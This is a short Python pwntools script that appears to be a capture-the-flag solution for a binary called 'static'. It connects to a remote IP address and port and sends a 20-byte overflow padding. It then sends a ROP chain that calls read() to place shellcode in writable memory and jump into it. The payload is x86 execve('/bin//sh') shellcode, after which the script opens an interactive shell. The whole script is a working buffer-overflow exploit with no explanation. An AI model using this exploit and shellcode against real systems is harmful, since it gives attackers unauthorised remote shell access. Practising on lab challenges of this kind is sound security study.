from pwn import*
elf=ELF('./static')
#p=process('./static')
p=remote('118.89.138.44',30001)
context.log_level='debug'
#gdb.attach(proc.pidof(p)[0])

shellcode="\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
payload='A'*20
payload+=p32(elf.plt['read'])
payload+=p32(0x804a000)
payload+=p32(0)
payload+=p32(0x804a000)
payload+=p32(len(shellcode)+1)

p.sendline(payload)
pause()
p.sendline(shellcode+'\0')

p.interactive()
